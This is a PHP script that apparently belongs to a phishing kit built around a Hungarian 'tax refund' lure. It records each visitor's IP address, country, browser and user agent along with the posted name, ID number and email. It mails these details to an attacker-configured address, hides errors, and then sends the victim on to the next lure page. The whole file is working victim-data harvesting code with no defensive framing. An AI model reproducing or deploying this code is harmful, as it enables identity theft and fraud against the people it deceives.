<?php
error_reporting(0);
session_start();
include("./config/madara.php");
include("./config/obito.php");
include("lang/". $_SESSION['_lang_'].".php");
        $_SESSION['cntcode'] = $countrycode;
        $_SESSION['cntname'] = $countryname;
        $ip = $_SERVER["REMOTE_ADDR"];
        $_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
	$time = date('l jS \of F Y h:i:s A');
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);
	$_SESSION['_browser_'] = $browser;
    $subject  = " Nav  [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
    $headers  = "MIME-Version: 1.0" . "\r\n";
	$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	$headers .= "From: noreply@madara.hu" . "\r\n";
	$message = "
<body style='background: black;'>			
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
<font color='#8b0000'>_____________________________________________________________________<br><br>
<font color='white'>IP         =>   <font color='#24ea18'>".$_SESSION['_IP_']."</font><br />
<font color='white'>TIME       =>   <font color='#24ea18'>".$time."</font><br />
<font color='white'>BROWSER    =>   <font color='#24ea18'>".$browser."</font><br />
<font color='white'>AGENT      =>   <font color='#24ea18'>".$user_agent."</font><br />
<font color='white'>Name       =>   <font color='#f0b34a'>".$_POST['e']."</font><br />
<font color='white'>idnumber   =>   <font color='#f0b34a'>".$_POST['p']."</font><br /> 
<font color='white'>email      =>   <font color='#f0b34a'>".$_POST['crr']."</font><br /> 
<font color='#8b0000'>___________________________________________________________________";
     	@mail($to,$subject,$message,$headers);
      $x=md5(microtime());$xx=sha1(microtime());
echo "<script> window.top.location.href = './adovisszaterites.php?';   </script>";
?>